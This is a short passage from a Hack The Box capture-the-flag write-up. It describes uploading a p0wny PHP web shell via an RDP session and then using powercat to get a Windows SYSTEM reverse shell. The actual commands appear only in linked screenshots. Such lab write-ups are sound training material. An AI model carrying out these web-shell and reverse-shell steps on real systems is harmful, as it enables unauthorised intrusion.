Since we have an RDP gui, we can just copy another php p0wny php shell in this location, and call it with firefox.<br>
Then, send a reverse shell in Windows with `powercat`

![hospital9](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/a2375ce6-2d11-4c9f-8f69-97c26e5d537e)

And a system reverse shelll is received our listener.

![hospital10](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/8ca4f994-f7b9-4b95-bbe2-2fc1228bbaec)




